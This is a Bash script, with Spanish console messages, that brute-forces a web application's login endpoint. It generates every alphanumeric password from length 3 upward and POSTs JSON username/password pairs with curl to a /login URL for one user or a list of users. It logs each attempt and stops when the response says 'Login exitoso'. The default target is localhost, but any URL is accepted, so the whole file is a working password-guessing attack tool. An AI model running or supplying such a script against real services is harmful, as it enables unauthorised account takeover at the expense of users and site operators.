#!/bin/bash

BASE_URL_DEFAULT="http://127.0.0.1:8000"
LOGIN_PATH="/login"
FIELD_NAME_DEFAULT="username"
CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
MIN_LEN=3
MAX_LEN=1000
DELAY=0
MAX_ATTEMPTS=100000000
STOP_ON_SUCCESS=true

if [ "$#" -lt 2 ]; then
  echo "Uso: $0 <base_url|use_default> <user_or_users_file> [field]"
  exit 1
fi

BASE_URL="$1"
if [ "$BASE_URL" = "use_default" ] || [ -z "$BASE_URL" ]; then
  BASE_URL="$BASE_URL_DEFAULT"
fi
USER_ARG="$2"
FIELD_NAME="${3:-$FIELD_NAME_DEFAULT}"

declare -a USERS
if [ -f "$USER_ARG" ]; then
  while IFS= read -r line || [ -n "$line" ]; do
    u="${line//$'\r'/}"
    if [ -n "$u" ]; then USERS+=("$u"); fi
  done < "$USER_ARG"
else
  v="${USER_ARG//$'\r'/}"
  USERS+=("$v")
fi

CHARLEN=${#CHARSET}
if [ "$CHARLEN" -eq 0 ]; then
  echo "CHARSET vacío. Edita la variable CHARSET arriba."
  exit 1
fi
declare -a CHARS
for ((i=0;i<CHARLEN;i++)); do
  CHARS[i]="${CHARSET:i:1}"
done

escape_for_json() {
  local s="$1"
  s="${s//$'\r'/}"
  s="${s//\"/\\\"}"
  printf '%s' "$s"
}

increment_indices() {
  local len=$1
  local i=$((len-1))
  while [ $i -ge 0 ]; do
    indices[$i]=$(( indices[$i] + 1 ))
    if [ "${indices[$i]}" -lt "$CHARLEN" ]; then
      return 0
    else
      indices[$i]=0
      i=$((i-1))
    fi
  done
  return 1
}

attempts=0
base_login_url="${BASE_URL%/}${LOGIN_PATH}"

echo "=== Brute force (console only) ==="
echo "URL: $base_login_url  FIELD: $FIELD_NAME  CHARSET_LEN: $CHARLEN  MIN:$MIN_LEN MAX:$MAX_LEN"
echo "----------------------------------"

for (( length=MIN_LEN; length<=MAX_LEN; length++ )); do
  unset indices
  declare -a indices
  for ((i=0;i<length;i++)); do indices[i]=0; done

  finished=0
  while [ $finished -eq 0 ]; do
    pwd=""
    for ((k=0;k<length;k++)); do
      pwd+="${CHARS[${indices[k]}]}"
    done

    for user in "${USERS[@]}"; do
      esc_user=$(escape_for_json "$user")
      esc_pwd=$(escape_for_json "$pwd")

      if [ "$FIELD_NAME" = "email" ]; then
        json="{\"email\":\"$esc_user\",\"password\":\"$esc_pwd\"}"
      else
        json="{\"username\":\"$esc_user\",\"password\":\"$esc_pwd\"}"
      fi

      response=$(curl -s -w "\n%{http_code}" -H "Content-Type: application/json" -X POST "$base_login_url" -d "$json" 2>/dev/null || echo $'\n000')
      http_code="${response##*$'\n'}"
      body="${response%$'\n'*}"

      timestamp=$(date +"%Y-%m-%d %H:%M:%S")
      echo "[$timestamp] intento=$attempts Nombre de Usuario='$user' clave='$pwd' http=$http_code body=$body"

      if echo "$body" | grep -qi "Login exitoso"; then
        echo "El usuario es ='$user' Contraseña ='$pwd' (http=$http_code)"
        if [ "$STOP_ON_SUCCESS" = true ]; then
          echo "Se encontro la clave :3"
          exit 0
        fi
      fi

      attempts=$((attempts+1))
      if [ "$attempts" -ge "$MAX_ATTEMPTS" ]; then
        echo "==> Alcanzado MAX_ATTEMPTS ($MAX_ATTEMPTS). Saliendo."
        exit 0
      fi

      sleep "$DELAY"
    done

    if increment_indices "$length"; then
      :
    else
      finished=1
    fi

  done
done

exit 0
